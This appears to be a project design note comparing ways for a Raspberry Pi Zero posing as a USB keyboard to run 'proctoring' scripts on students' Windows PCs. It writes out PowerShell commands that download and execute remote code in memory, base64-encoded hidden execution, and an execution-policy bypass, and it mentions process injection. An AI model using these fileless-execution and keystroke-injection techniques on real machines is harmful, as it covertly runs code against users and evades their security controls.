# 1. Fileless Execution

**Prerequisite:**
- The Raspberry Pi has already been configured to achieve composite mode (See Libcomposite for more info)

Using the Raspberry Pi Zero W, HID mode, keystroke can be sent to execute "Run". Following which, additional keystrokes command can be sent from the examples below to conduct proctoring.  

With the Fileless Execution method, we do not need to copy any external binary executable/scripts to be able to conduct proctoring. Instead we utilize a Windows built-in software Powershell, to download additional scripts and run them purely in memory. 

Reference materials:
- https://www.mcafee.com/enterprise/en-us/assets/solution-briefs/sb-fileless-malware-execution.pdf
- https://www.varonis.com/blog/fileless-malware
- https://www.linkedin.com/pulse/go-hell-powershell-powerdown-attacks-kirtar-oza-cissp-cisa-ms-

## 1.1. Utilizing DownloadString and Invoke-Expression Parameters
```
powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('<proctoring script url>')
```
Executing the above allow us conduct proctoring directly in to the memory of the Student's PC.  
This is possible because of two Powershell command 
- "DownloadString" where it does not download any file to disk but copies content of the remote file. 
- "Invoke-Expression a.k.a iex" where it runs specified string as a command.

## 1.2. Utilizing EncodedCommand Parameters
To do this we must first, encode our script into base64 using the script below and taking note of the encoded string
```
$command = '<the whole script>'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
write-host $encodedCommand
```
After we know the encoded string, runnning the command below will allow us to conduct proctoring without needing to drop any files into the student's PC. In this case, we would not even need to have a remote script stored anywhere.
```
powershell.exe -executionpolicy bypass -w hidden -e <base64encodedstring>
```
The EncodedCommand a.k.a -e, will read the following given as a base64 string and proceed to execute it 

## 1.3 Additional Parameters
- WindowStyle (-w) hidden: This makes the Powershell operation stealth by hiding the program window away from the user
- Exec Bypass: bypass/ignore the execution policy like _Restricted_ which restricts the PS command from running
  - With this even if user set _ExecutionPolicy: Restricted_, we are still able to run the proctoring script
- Noprofile (-nop): Ignore the commands in the Profile file

## Pros:
- Not intrusive, no file will be downloaded and placed in the student's PC 
- Students have no access to the proctoring script at all 
- Execute in the background hidden
- When updating the proctoring script, proctors can just re-host the newest version on the remote server

## Cons:
- Proctoring Script have to be written in powershell language
- A remote server to serve the proctoring script from method 1.1
- For method 1.2, if there is any update on the proctoring script, encodedstring have to be reformed and HID keystroke commands have to be editted too on every single raspberry pi

# 2. Mass Storage 

**Prerequisite:**
- The Raspberry Pi has already been configured to achieve composite mode (See Libcomposite for more info)

In this method we utilize the Mass storage mode and HID mode of the composite Pi.  
1. We will be placing in the backing store (storage) created in the Pi. 
2. Once the Pi is connected, the emulated mass storage will be visible.
3. Inside the storage device, the proctoring script will then be present.
4. From there, we can send in keystrokes using the HID mode to execute the script from Windows built in programs (such as cmd.exe or powershell.exe) inside the emulated mass storage device in the Student's PC

## Pros:
- Not much pros

## Cons:
- Script is accessible to students which will allow them to study it and possbily find ways to avoid detection
- In the event of proctoring script updating, every Pi have to be updated manually

# 3. Pymem

**Prerequisite:**
- The Raspberry Pi has already been configured to achieve composite mode (See Libcomposite for more info)

This method allows the injection of python interpreter into any process. 

## Pros:
- NA 

## Cons: 
- Script that does the injection is presented in the Student's PC
- In the script that perform the injection, the proctoring features is exposed to the students. 

